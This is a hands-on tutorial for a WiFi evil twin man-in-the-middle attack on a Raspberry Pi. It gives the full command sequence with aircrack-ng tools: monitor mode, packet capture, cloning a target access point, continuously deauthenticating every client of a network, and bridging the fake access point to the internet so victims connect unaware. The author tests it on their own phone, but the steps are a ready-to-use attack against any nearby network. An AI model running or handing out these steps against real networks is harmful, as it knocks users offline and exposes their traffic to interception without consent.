Now we want to get started learning some simple WiFi hacks.

We will:

1. Enable our WiFi adapter for monitoring mode.
2. Perform a simple Evil twin attack which is a kind of Man in the middle attack that will allow your Raspberry Pi to act as an AP to monitor information.

Getting Started:
  1. Plug in and turn on your Raspberry Pi
  2. You will need to install bridge utils.
    - After you've SSH'd into your Raspberry pi, run:
      `apt-get install bridge-utils`

Steps:

  1. To show available wireless interfaces run:
      `iwconfig`

    <img src="img/iwconfig.jpg"/>

  2. Start monitor mode on the available WiFi device.
    Run:
      `airmon-ng start wlan1`

    Also make note of any alerts like:
      `Found 3 processes that could cause trouble.`

      <img src="img/airmonstart.jpg"/>

      "Kill" those processes, they may interfere they may not, you will need to restart the dhclient later:
        `airmon-ng check kill`
      Then re-run:
        `airmon-ng start wlan1`
      <img src="img/airmonstart2.jpg"/>
  3. Capture packets from the air using the device you put in monitor mode.
      - Run:
        `airodump-ng wlan1mon`

        <img src="img/capturepackets.jpg"/>

      - After about half a minute enter `control + c` and open a new terminal

      - Open an SSH session with your Raspberry Pi in that terminal like you did at the beginning.

    4. Create the twin

  Run:
          `airbase-ng -a [BSSID] --essid <ESSID here> -c <channel here> <interface name>`
5. Deauthenticate the client
For this I am using my phone as the client that is the target of the attack.
          Run:

              `aireplay-ng --deauth 0 -a [BSSID] wlan1mon --ignore-negative-one`

"0" sets the time interval for sending de-authentication requests. 0 = very fast, 1 = 1/second, 2 = 1 every 2 seconds, etc.

This will disconnect all clients from the network

  <img src="img/deauth.jpg"/>

  6. Give the "evil twin" internet access
    This will provide internet access to the fake Access Point and allow clients to connect thinking they're accessing the real Access Point.

        Run:
          `brctl addbr evil`
        This creates a bridge.

        `brctl addif evil eth0`
        and
        `brctl addif evil at0`

        are the two interfaces being bridged.

        "eth0" is the the internet connection on my Raspberry Pi

        and "at0" is the interface created by airmon-ng that clients will connect to the internet through.

        Next you want to assign IP's to the interfaces with:
        `ifconfig eth0 0.0.0.0 up`
        `ifconfig at0 0.0.0.0 up`

        Bring up the evil interface:
        `ifconfig evil up`

        Auto configure DHCP settings:
        `dhclient evil &`

        This completes the set up for the attack. You can see my phone connecting to the "Evil twin"
<img src="img/phone.jpg"/>
